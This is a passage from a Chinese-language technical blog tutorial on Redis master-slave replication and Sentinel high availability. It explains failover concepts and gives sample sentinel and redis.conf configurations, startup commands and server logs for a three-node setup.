class="line">repl_backlog_histlen:28</span><br></pre></td></tr></table></figure>

<p>Redis 从服务器 的状态如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:slave</span><br><span class="line">master_host:10.206.20.231</span><br><span class="line">master_port:26379</span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:3</span><br><span class="line">master_sync_in_progress:0</span><br><span class="line">slave_repl_offset:210</span><br><span class="line">slave_priority:100</span><br><span class="line">slave_read_only:1</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_replid:625ae9f362643da5337835beaeabfdca426198c7</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:210</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:1</span><br><span class="line">repl_backlog_histlen:210</span><br></pre></td></tr></table></figure>

<h5 id="Redis-主从配置验证"><a href="#Redis-主从配置验证" class="headerlink" title="Redis 主从配置验证"></a>Redis 主从配置验证</h5><p>上面完成了基本的 主从配置，可以简单的测试一下效果：</p>
<ul>
<li><p>进入 主服务器 的 redis-cli 模式，然后 <code>set</code> 一个值，比如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> master_port <span class="string">"16379"</span></span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
</li>
<li><p>切换进入 从服务器 的 redis-cli 的模式，查询刚刚设置的值看是否存在：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> get master_port</span></span><br><span class="line">"16379"</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>此时，我们可以发现是可以获取到值的，Redis 的 主从模式 正常工作。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简单的说明了 Redis 的相关 特性 和 应用场景，详细地给出 Redis 单服务器的 编译，安装，配置 和 启动，进一步引入了 Redis 主从复制 的相关原理和详细配置。关于 Redis 的 高可用机制 和 集群搭建，下文将给出详细的说明。</p>
<hr>
<h1 id="哨兵模式与高可用集群"><a href="#哨兵模式与高可用集群" class="headerlink" title="哨兵模式与高可用集群"></a>哨兵模式与高可用集群</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>Redis 的 主从复制 模式下，一旦 主节点 由于故障不能提供服务，需要手动将 从节点 晋升为 主节点，同时还要通知 客户端 更新 主节点地址，这种故障处理方式从一定程度上是无法接受的。Redis 2.8 以后提供了 Redis Sentinel 哨兵机制 来解决这个问题。</p>
<h2 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h2><h3 id="Redis-高可用概述"><a href="#Redis-高可用概述" class="headerlink" title="Redis 高可用概述"></a>Redis 高可用概述</h3><p>在 Web 服务器中，高可用 是指服务器可以 正常访问 的时间，衡量的标准是在 多长时间 内可以提供正常服务（99.9%、99.99%、99.999% 等等）。在 Redis 层面，高可用 的含义要宽泛一些，除了保证提供 正常服务（如 主从分离、快速容灾技术 等），还需要考虑 数据容量扩展、数据安全 等等。  </p>
<p>在 Redis 中，实现 高可用 的技术主要包括 持久化、复制、哨兵 和 集群，下面简单说明它们的作用，以及解决了什么样的问题：</p>
<ul>
<li>持久化：持久化是 最简单的 高可用方法。它的主要作用是 数据备份，即将数据存储在 硬盘，保证数据不会因进程退出而丢失。</li>
<li>复制：复制是高可用 Redis 的基础，哨兵 和 集群 都是在 复制基础 上实现高可用的。复制主要实现了数据的多机备份以及对于读操作的负载均衡和简单的故障恢复。缺陷是故障恢复无法自动化、写操作无法负载均衡、存储能力受到单机的限制。</li>
<li>哨兵：在复制的基础上，哨兵实现了 自动化 的 故障恢复。缺陷是 写操作 无法 负载均衡，存储能力 受到 单机 的限制。</li>
<li>集群：通过集群，Redis 解决了 写操作 无法 负载均衡 以及 存储能力 受到 单机限制 的问题，实现了较为 完善 的 高可用方案。</li>
</ul>
<h3 id="Redis-Sentinel-的基本概念"><a href="#Redis-Sentinel-的基本概念" class="headerlink" title="Redis Sentinel 的基本概念"></a>Redis Sentinel 的基本概念</h3><p>Redis Sentinel 是 Redis 高可用 的实现方案。Sentinel 是一个管理多个 Redis 实例的工具，它可以实现对 Redis 的 监控、通知、自动故障转移。下面先对 Redis Sentinel 的 基本概念 进行简单的介绍。  </p>
<p>基本名词说明：</p>
<table>
<thead>
<tr>
<th>基本名词</th>
<th>逻辑结构</th>
<th>物理结构</th>
</tr>
</thead>
<tbody><tr>
<td>Redis 数据节点</td>
<td>主节点和从节点</td>
<td>主节点和从节点的进程</td>
</tr>
<tr>
<td>主节点（master）</td>
<td>Redis 主数据库</td>
<td>一个独立的 Redis 进程</td>
</tr>
<tr>
<td>从节点（slave）</td>
<td>Redis 从数据库</td>
<td>一个独立的 Redis 进程</td>
</tr>
<tr>
<td>Sentinel 节点</td>
<td>监控 Redis 数据节点</td>
<td>一个独立的 Sentinel 进程</td>
</tr>
<tr>
<td>Sentinel 节点集合</td>
<td>若干 Sentinel 节点的抽象组合</td>
<td>若干 Sentinel 节点进程</td>
</tr>
<tr>
<td>Redis Sentinel</td>
<td>Redis 高可用实现方案</td>
<td>Sentinel 节点集合和 Redis 数据节点进程</td>
</tr>
<tr>
<td>应用客户端</td>
<td>泛指一个或多个客户端</td>
<td>一个或者多个客户端进程或者线程</td>
</tr>
</tbody></table>
<p>如图所示，Redis 的 主从复制模式 和 Sentinel 高可用架构 的示意图：</p>
<figure class="image-box">
                <img src="16560ce611d8c4a5.png" alt title class>
                <p></p>
            </figure>

<h3 id="Redis-主从复制的问题"><a href="#Redis-主从复制的问题" class="headerlink" title="Redis 主从复制的问题"></a>Redis 主从复制的问题</h3><p>Redis 主从复制 可将 主节点 数据同步给 从节点，从节点此时有两个作用：</p>
<ol>
<li>一旦 主节点宕机，从节点 作为 主节点 的 备份 可以随时顶上来。</li>
<li>扩展 主节点 的 读能力，分担主节点读压力。</li>
</ol>
<figure class="image-box">
                <img src="16560ce61dbb9d7e.png" alt title class>
                <p></p>
            </figure>

<p>主从复制 同时存在以下几个问题：</p>
<ol>
<li>一旦 主节点宕机，从节点 晋升成 主节点，同时需要修改 应用方 的 主节点地址，还需要命令所有 从节点 去 复制 新的主节点，整个过程需要 人工干预。</li>
<li>主节点 的 写能力 受到 单机的限制。</li>
<li>主节点 的 存储能力 受到 单机的限制。</li>
<li>原生复制 的弊端在早期的版本中也会比较突出，比如：Redis 复制中断 后，从节点 会发起 <code>psync</code>。此时如果 同步不成功，则会进行 全量同步，主库 执行 全量备份 的同时，可能会造成毫秒或秒级的 卡顿。</li>
</ol>
<h3 id="Redis-Sentinel-深入探究"><a href="#Redis-Sentinel-深入探究" class="headerlink" title="Redis Sentinel 深入探究"></a>Redis Sentinel 深入探究</h3><h4 id="Redis-Sentinel-的架构"><a href="#Redis-Sentinel-的架构" class="headerlink" title="Redis Sentinel 的架构"></a>Redis Sentinel 的架构</h4><figure class="image-box">
                <img src="16560ce61dbc4eeb.png" alt title class>
                <p></p>
            </figure>

<h4 id="Redis-Sentinel-的主要功能"><a href="#Redis-Sentinel-的主要功能" class="headerlink" title="Redis Sentinel 的主要功能"></a>Redis Sentinel 的主要功能</h4><p>Sentinel 的主要功能包括 主节点存活检测、主从运行情况检测、自动故障转移 （failover）、主从切换。Redis 的 Sentinel 最小配置是 一主一从。  </p>
<p>Redis 的 Sentinel 系统可以用来管理多个 Redis 服务器，该系统可以执行以下四个任务：</p>
<ul>
<li>监控<br>Sentinel 会不断的检查 主服务器 和 从服务器 是否正常运行。</li>
<li>通知<br>当被监控的某个 Redis 服务器出现问题，Sentinel 通过 API 脚本 向 管理员 或者其他的 应用程序 发送通知。</li>
<li>自动故障转移<br>当 主节点 不能正常工作时，Sentinel 会开始一次 自动的 故障转移操作，它会将与 失效主节点 是 主从关系 的其中一个 从节点 升级为新的 主节点，并且将其他的 从节点 指向 新的主节点。</li>
<li>配置提供者<br>在 Redis Sentinel 模式下，客户端应用 在初始化时连接的是 Sentinel 节点集合，从中获取 主节点 的信息。</li>
</ul>
<h4 id="主观下线和客观下线"><a href="#主观下线和客观下线" class="headerlink" title="主观下线和客观下线"></a>主观下线和客观下线</h4><p>默认情况下，每个 Sentinel 节点会以 每秒一次 的频率对 Redis 节点和 其它 的 Sentinel 节点发送 <code>PING</code> 命令，并通过节点的 回复 来判断节点是否在线。</p>
<ul>
<li>主观下线<br>主观下线 适用于所有 主节点 和 从节点。如果在 <code>down-after-milliseconds</code> 毫秒内，Sentinel 没有收到 目标节点 的有效回复，则会判定 该节点 为 主观下线。</li>
<li>客观下线<br>客观下线 只适用于 主节点。如果 主节点 出现故障，Sentinel 节点会通过 <code>sentinel is-master-down-by-addr</code> 命令，向其它 Sentinel 节点询问对该节点的 状态判断。如果超过 <code>&lt;quorum&gt;</code> 个数的节点判定 主节点 不可达，则该 Sentinel 节点会判断 主节点 为 客观下线。</li>
</ul>
<h4 id="Sentinel-的通信命令"><a href="#Sentinel-的通信命令" class="headerlink" title="Sentinel 的通信命令"></a>Sentinel 的通信命令</h4><p>Sentinel 节点连接一个 Redis 实例的时候，会创建 <strong>cmd</strong> 和 <strong>pub/sub</strong> 两个 连接。Sentinel 通过 cmd 连接给 Redis 发送命令，通过 pub/sub 连接到 Redis 实例上的其他 Sentinel 实例。  </p>
<p>Sentinel 与 Redis 主节点 和 从节点 交互的命令，主要包括：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td><code>PING</code></td>
<td>Sentinel 向 Redis 节点发送 PING 命令，检查节点的状态</td>
</tr>
<tr>
<td><code>INFO</code></td>
<td>Sentinel 向 Redis 节点发送 INFO 命令，获取它的 从节点信息</td>
</tr>
<tr>
<td><code>PUBLISH</code></td>
<td>Sentinel 向其监控的 Redis 节点 <code>__sentinel__:hello</code> 这个 channel 发布 自己的信息 及 主节点 相关的配置</td>
</tr>
<tr>
<td><code>SUBSCRIBE</code></td>
<td>Sentinel 通过订阅 Redis 主节点 和 从节点 的 <code>__sentinel__:hello</code> 这个 channnel，获取正在监控相同服务的其他 Sentinel 节点</td>
</tr>
</tbody></table>
<p>Sentinel 与 Sentinel 交互的命令，主要包括：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td><code>PING</code></td>
<td>Sentinel 向其他 Sentinel 节点发送 PING 命令，检查节点的状态</td>
</tr>
<tr>
<td><code>SENTINEL:is-master-down-by-addr</code></td>
<td>和其他 Sentinel 协商 主节点 的状态，如果 主节点 处于 SDOWN 状态，则投票自动选出新的 主节点</td>
</tr>
</tbody></table>
<h4 id="Redis-Sentinel-的工作原理"><a href="#Redis-Sentinel-的工作原理" class="headerlink" title="Redis Sentinel 的工作原理"></a>Redis Sentinel 的工作原理</h4><p>每个 Sentinel 节点都需要 定期执行 以下任务：</p>
<ol>
<li><p>每个 Sentinel 以 每秒钟 一次的频率，向它所知的 主服务器、从服务器 以及其他 Sentinel 实例 发送一个 <code>PING</code> 命令。</p>
<figure class="image-box">
                <img src="16560ce61df44c4d.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>如果一个 实例（instance）距离 最后一次 有效回复 <code>PING</code> 命令的时间超过 <code>down-after-milliseconds</code> 所指定的值，那么这个实例会被 Sentinel 标记为 主观下线。</p>
<figure class="image-box">
                <img src="16560ce61dc739de.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>如果一个 主服务器 被标记为 主观下线，那么正在 监视 这个 主服务器 的所有 Sentinel 节点，要以 每秒一次 的频率确认 主服务器 的确进入了 主观下线 状态。</p>
<figure class="image-box">
                <img src="16560ce647a39535.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>如果一个 主服务器 被标记为 主观下线，并且有 足够数量 的 Sentinel（至少要达到 配置文件 指定的数量）在指定的 时间范围 内同意这一判断，那么这个 主服务器 被标记为 客观下线。</p>
<figure class="image-box">
                <img src="16560ce647c2583e.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>在一般情况下， 每个 Sentinel 会以每 10 秒一次的频率，向它已知的所有 主服务器 和 从服务器 发送 INFO 命令。当一个 主服务器 被 Sentinel 标记为 客观下线 时，Sentinel 向 下线主服务器 的所有 从服务器 发送 <code>INFO</code> 命令的频率，会从 10 秒一次改为 每秒一次。</p>
<figure class="image-box">
                <img src="16560ce6738a30db.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>Sentinel 和其他 Sentinel 协商 主节点 的状态，如果 主节点 处于 SDOWN 状态，则投票自动选出新的 主节点。将剩余的 从节点 指向 新的主节点 进行 数据复制。</p>
<figure class="image-box">
                <img src="16560ce676a95a54.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>当没有足够数量的 Sentinel 同意 主服务器 下线时， 主服务器 的 客观下线状态 就会被移除。当 主服务器 重新向 Sentinel 的 <code>PING</code> 命令返回 有效回复 时，主服务器 的 主观下线状态 就会被移除。</p>
<figure class="image-box">
                <img src="16560ce6759c1cb3.png" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<blockquote>
<p>注意：一个有效的 PING 回复可以是：<code>+PONG</code>、<code>-LOADING</code> 或者 <code>-MASTERDOWN</code>。如果 服务器 返回除以上三种回复之外的其他回复，又或者在 指定时间 内没有回复 <code>PING</code> 命令， 那么 Sentinel 认为服务器返回的回复 无效（non-valid）。</p>
</blockquote>
<h3 id="Redis-Sentinel-搭建"><a href="#Redis-Sentinel-搭建" class="headerlink" title="Redis Sentinel 搭建"></a>Redis Sentinel 搭建</h3><h4 id="Redis-Sentinel-的部署须知"><a href="#Redis-Sentinel-的部署须知" class="headerlink" title="Redis Sentinel 的部署须知"></a>Redis Sentinel 的部署须知</h4><ol>
<li>一个稳健的 Redis Sentinel 集群，应该使用至少 三个 Sentinel 实例，并且保证讲这些实例放到 不同的机器 上，甚至不同的 物理区域。</li>
<li>Sentinel 无法保证 强一致性。</li>
<li>常见的 客户端应用库 都支持 Sentinel。</li>
<li>Sentinel 需要通过不断的 测试 和 观察，才能保证高可用。</li>
</ol>
<h4 id="Redis-Sentinel-的配置文件"><a href="#Redis-Sentinel-的配置文件" class="headerlink" title="Redis Sentinel 的配置文件"></a>Redis Sentinel 的配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 哨兵 sentinel 实例运行的端口，默认 26379  </span></span><br><span class="line">port 26379</span><br><span class="line"><span class="comment"># 哨兵 sentinel 的工作目录</span></span><br><span class="line">dir ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># 哨兵 sentinel 监控的 redis 主节点的 </span></span><br><span class="line"><span class="comment">## ip：主机ip地址</span></span><br><span class="line"><span class="comment">## port：哨兵端口号</span></span><br><span class="line"><span class="comment">## master-name：可以自己命名的主节点名字（只能由字母 A-z、数字 0-9 、这三个字符 ".-_" 组成。）</span></span><br><span class="line"><span class="comment">## quorum：当这些 quorum 个数 sentinel 哨兵认为 master 主节点失联 那么这时 客观上认为主节点失联了  </span></span><br><span class="line"><span class="comment"># sentinel monitor &lt;master-name&gt; &lt;ip&gt; &lt;redis-port&gt; &lt;quorum&gt;  </span></span><br><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当在 Redis 实例中开启了 requirepass &lt;foobared&gt; ，所有连接 Redis 实例的客户端都要提供密码。</span></span><br><span class="line"><span class="comment"># sentinel auth-pass &lt;master-name&gt; &lt;password&gt;  </span></span><br><span class="line">sentinel auth-pass mymaster 123456  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定主节点应答哨兵 sentinel 的最大时间间隔，超过这个时间，哨兵主观上认为主节点下线，默认 30 秒  </span></span><br><span class="line"><span class="comment"># sentinel down-after-milliseconds &lt;master-name&gt; &lt;milliseconds&gt;</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 30000  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定了在发生 failover 主备切换时，最多可以有多少个 slave 同时对新的 master 进行同步。这个数字越小，完成 failover 所需的时间就越长；反之，但是如果这个数字越大，就意味着越多的 slave 因为 replication 而不可用。可以通过将这个值设为 1 ，来保证每次只有一个 slave，处于不能处理命令请求的状态。</span></span><br><span class="line"><span class="comment"># sentinel parallel-syncs &lt;master-name&gt; &lt;numslaves&gt;</span></span><br><span class="line">sentinel parallel-syncs mymaster 1  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 故障转移的超时时间 failover-timeout ，默认三分钟，可以用在以下这些方面：</span></span><br><span class="line"><span class="comment">## 1. 同一个 sentinel 对同一个 master 两次 failover 之间的间隔时间。  </span></span><br><span class="line"><span class="comment">## 2. 当一个 slave 从一个错误的 master 那里同步数据时开始，直到 slave 被纠正为从正确的 master 那里同步数据时结束。  </span></span><br><span class="line"><span class="comment">## 3. 当想要取消一个正在进行的 failover 时所需要的时间。</span></span><br><span class="line"><span class="comment">## 4.当进行 failover 时，配置所有 slaves 指向新的 master 所需的最大时间。不过，即使过了这个超时，slaves 依然会被正确配置为指向 master，但是就不按 parallel-syncs 所配置的规则来同步数据了</span></span><br><span class="line"><span class="comment"># sentinel failover-timeout &lt;master-name&gt; &lt;milliseconds&gt;  </span></span><br><span class="line">sentinel failover-timeout mymaster 180000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当 sentinel 有任何警告级别的事件发生时（比如说 redis 实例的主观失效和客观失效等等），将会去调用这个脚本。一个脚本的最大执行时间为 60s ，如果超过这个时间，脚本将会被一个 SIGKILL 信号终止，之后重新执行。</span></span><br><span class="line"><span class="comment"># 对于脚本的运行结果有以下规则：  </span></span><br><span class="line"><span class="comment">## 1. 若脚本执行后返回 1，那么该脚本稍后将会被再次执行，重复次数目前默认为 10。</span></span><br><span class="line"><span class="comment">## 2. 若脚本执行后返回 2，或者比 2 更高的一个返回值，脚本将不会重复执行。  </span></span><br><span class="line"><span class="comment">## 3. 如果脚本在执行过程中由于收到系统中断信号被终止了，则同返回值为 1 时的行为相同。</span></span><br><span class="line"><span class="comment"># sentinel notification-script &lt;master-name&gt; &lt;script-path&gt;  </span></span><br><span class="line">sentinel notification-script mymaster /var/redis/notify.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个脚本应该是通用的，能被多次调用，不是针对性的。</span></span><br><span class="line"><span class="comment"># sentinel client-reconfig-script &lt;master-name&gt; &lt;script-path&gt;</span></span><br><span class="line">sentinel client-reconfig-script mymaster /var/redis/reconfig.sh</span><br></pre></td></tr></table></figure>

<h4 id="Redis-Sentinel-的节点规划"><a href="#Redis-Sentinel-的节点规划" class="headerlink" title="Redis Sentinel 的节点规划"></a>Redis Sentinel 的节点规划</h4><table>
<thead>
<tr>
<th>角色</th>
<th>IP地址</th>
<th>端口号</th>
</tr>
</thead>
<tbody><tr>
<td>Redis Master</td>
<td>10.206.20.231</td>
<td>16379</td>
</tr>
<tr>
<td>Redis Slave1</td>
<td>10.206.20.231</td>
<td>26379</td>
</tr>
<tr>
<td>Redis Slave2</td>
<td>10.206.20.231</td>
<td>36379</td>
</tr>
<tr>
<td>Redis Sentinel1</td>
<td>10.206.20.231</td>
<td>16380</td>
</tr>
<tr>
<td>Redis Sentinel2</td>
<td>10.206.20.231</td>
<td>26380</td>
</tr>
<tr>
<td>Redis Sentinel3</td>
<td>10.206.20.231</td>
<td>36380</td>
</tr>
</tbody></table>
<h4 id="Redis-Sentinel-的配置搭建"><a href="#Redis-Sentinel-的配置搭建" class="headerlink" title="Redis Sentinel 的配置搭建"></a>Redis Sentinel 的配置搭建</h4><h5 id="Redis-Server-的配置管理"><a href="#Redis-Server-的配置管理" class="headerlink" title="Redis-Server 的配置管理"></a>Redis-Server 的配置管理</h5><p>分别拷贝三份 <code>redis.conf</code> 文件到 /usr/local/redis-sentinel 目录下面。三个配置文件分别对应 master、slave1 和 slave2 三个 Redis 节点的 启动配置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/redis.conf /usr/<span class="built_in">local</span>/redis-sentinel/redis-16379.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/redis.conf /usr/<span class="built_in">local</span>/redis-sentinel/redis-26379.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/redis.conf /usr/<span class="built_in">local</span>/redis-sentinel/redis-36379.conf</span></span><br></pre></td></tr></table></figure>

<p>分别修改三份配置文件如下：</p>
<ul>
<li><p>主节点：redis-16379.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis-16379.pid</span><br><span class="line">logfile /var/log/redis/redis-16379.log</span><br><span class="line">port 16379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename dump-16379.db</span><br><span class="line">dir ./redis-workdir</span><br><span class="line">masterauth 123456</span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure>
</li>
<li><p>从节点1：redis-26379.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis-26379.pid</span><br><span class="line">logfile /var/log/redis/redis-26379.log</span><br><span class="line">port 26379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename dump-26379.db</span><br><span class="line">dir ./redis-workdir</span><br><span class="line">masterauth 123456</span><br><span class="line">requirepass 123456</span><br><span class="line">slaveof 127.0.0.1 16379</span><br></pre></td></tr></table></figure>
</li>
<li><p>从节点2：redis-36379.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis-36379.pid</span><br><span class="line">logfile /var/log/redis/redis-36379.log</span><br><span class="line">port 36379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename dump-36379.db</span><br><span class="line">dir ./redis-workdir</span><br><span class="line">masterauth 123456</span><br><span class="line">requirepass 123456</span><br><span class="line">slaveof 127.0.0.1 16379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>如果要做 自动故障转移，建议所有的 <code>redis.conf</code> 都设置 <code>masterauth</code>。因为 自动故障 只会重写 主从关系，即 <code>slaveof</code>，不会自动写入 <code>masterauth</code>。如果 Redis 原本没有设置密码，则可以忽略。</p>
</blockquote>
<h5 id="Redis-Server-启动验证"><a href="#Redis-Server-启动验证" class="headerlink" title="Redis-Server 启动验证"></a>Redis-Server 启动验证</h5><p>按顺序分别启动 16379，26379 和 36379 三个 Redis 节点，启动命令和启动日志如下：  </p>
<p>Redis 的启动命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-server /usr/<span class="built_in">local</span>/redis-sentinel/redis-16379.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-server /usr/<span class="built_in">local</span>/redis-sentinel/redis-26379.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo redis-server /usr/<span class="built_in">local</span>/redis-sentinel/redis-36379.conf</span></span><br></pre></td></tr></table></figure>

<p>查看 Redis 的启动进程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ef | grep redis-server</span></span><br><span class="line">    0  7127     1   0  2:16下午 ??         0:01.84 redis-server 0.0.0.0:16379 </span><br><span class="line">    0  7133     1   0  2:16下午 ??         0:01.73 redis-server 0.0.0.0:26379 </span><br><span class="line">    0  7137     1   0  2:16下午 ??         0:01.70 redis-server 0.0.0.0:36379</span><br></pre></td></tr></table></figure>

<p>查看 Redis 的启动日志：</p>
<ul>
<li>节点 redis-16379<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /var/<span class="built_in">log</span>/redis/redis-16379.log </span></span><br><span class="line">7126:C 22 Aug 14:16:38.907 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">7126:C 22 Aug 14:16:38.908 # Redis version=4.0.11, bits=64, commit=00000000, modified=0, pid=7126, just started</span><br><span class="line">7126:C 22 Aug 14:16:38.908 # Configuration loaded</span><br><span class="line">7127:M 22 Aug 14:16:38.910 * Increased maximum number of open files to 10032 (it was originally set to 256).</span><br><span class="line">7127:M 22 Aug 14:16:38.912 * Running mode=standalone, port=16379.</span><br><span class="line">7127:M 22 Aug 14:16:38.913 # Server initialized</span><br><span class="line">7127:M 22 Aug 14:16:38.913 * Ready to accept connections</span><br><span class="line">7127:M 22 Aug 14:16:48.416 * Slave 127.0.0.1:26379 asks for synchronization</span><br><span class="line">7127:M 22 Aug 14:16:48.416 * Full resync requested by slave 127.0.0.1:26379</span><br><span class="line">7127:M 22 Aug 14:16:48.416 * Starting BGSAVE for SYNC with target: disk</span><br><span class="line">7127:M 22 Aug 14:16:48.416 * Background saving started by pid 7134</span><br><span class="line">7134:C 22 Aug 14:16:48.433 * DB saved on disk</span><br><span class="line">7127:M 22 Aug 14:16:48.487 * Background saving terminated with success</span><br><span class="line">7127:M 22 Aug 14:16:48.494 * Synchronization with slave 127.0.0.1:26379 succeeded</span><br><span class="line">7127:M 22 Aug 14:16:51.848 * Slave 127.0.0.1:36379 asks for synchronization</span><br><span class="line">7127:M 22 Aug 14:16:51.849 * Full resync requested by slave 127.0.0.1:36379</span><br><span class="line">7127:M 22 Aug 14:16:51.849 * Starting BGSAVE for SYNC with target: disk</span><br><span class="line">7127:M 22 Aug 14:16:51.850 * Background saving started by pid 7138</span><br><span class="line">7138:C 22 Aug 14:16:51.862 * DB saved on disk</span><br><span class="line">7127:M 22 Aug 14:16:51.919 * Background saving terminated with success</span><br><span class="line">7127:M 22 Aug 14:16:51.923 * Synchronization with slave 127.0.0.1:36379 succeeded</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>以下两行日志日志表明，redis-16379 作为 Redis 的 主节点，redis-26379 和 redis-36379 作为 从节点，从 主节点 同步数据。</p>
